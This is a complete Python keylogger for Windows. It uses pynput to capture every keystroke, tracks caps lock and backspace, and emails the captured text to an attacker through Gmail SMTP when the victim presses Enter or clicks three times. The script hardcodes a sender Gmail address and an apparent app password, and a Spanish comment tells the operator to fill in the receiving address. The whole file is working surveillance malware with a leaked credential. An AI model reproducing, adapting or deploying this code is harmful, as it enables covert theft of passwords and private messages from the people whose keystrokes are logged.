from email.message import EmailMessage
from pynput import keyboard
from pynput import mouse
import ssl, smtplib, ctypes


caps_lock_state = False
def check_caps_lock():
 global caps_lock_state
 if ctypes.windll.user32.GetKeyState(0x14) & 0x0001:
  caps_lock_state = True
 else:
  caps_lock_state = False

letters = []
npress = []

def send_mail(mensaje):
 correo_emisor="pgx008915@gmail.com"
 clave="xuhk kdwn ssqf hcbz"
 correo_receptor="" ### PON AQUI EL CORREO DONDE RECIBIRAS LAS PULSACIONES PENDEJO ###
 asunto="keylogger_working"
 body=f"""
{mensaje}
 """
 em=EmailMessage()
 em["From"] = correo_emisor
 em["To"] = correo_receptor
 em["Subject"] = asunto
 em.set_content(body)

 context=ssl.create_default_context()
 with smtplib.SMTP_SSL("smtp.gmail.com", 465, context=context) as smtp:
  smtp.login(correo_emisor, clave)
  smtp.sendmail(correo_emisor, correo_receptor, em.as_string())

def send():
 send = ''.join(letters)
 rangex = len(send)
 if rangex != 0:
  send_mail(send)
  print('CORREO ENVIADO')
  letters.clear()

def on_press(key):
 global caps_lock_state
 check_caps_lock()
 try:
  if caps_lock_state:
   letters.append(key.char.upper())
  else:
   letters.append(key.char.lower())
 except AttributeError:
  if key == keyboard.Key.enter:
   send()
  elif key == keyboard.Key.space:
   letters.append(' ')
  elif key == keyboard.Key.backspace:
   if letters:
    letters.pop()

def on_click(x, y, button, pressed):
 if pressed:
  if button == mouse.Button.left:
    npress.append(1)
    if len(npress) == 3:
     send()
     letters.clear()
     npress.clear()

keyboard_listener = keyboard.Listener(on_press=on_press)
mouse_listener = mouse.Listener(on_click=on_click)
keyboard_listener.start()
mouse_listener.start()
keyboard_listener.join()
mouse_listener.join()

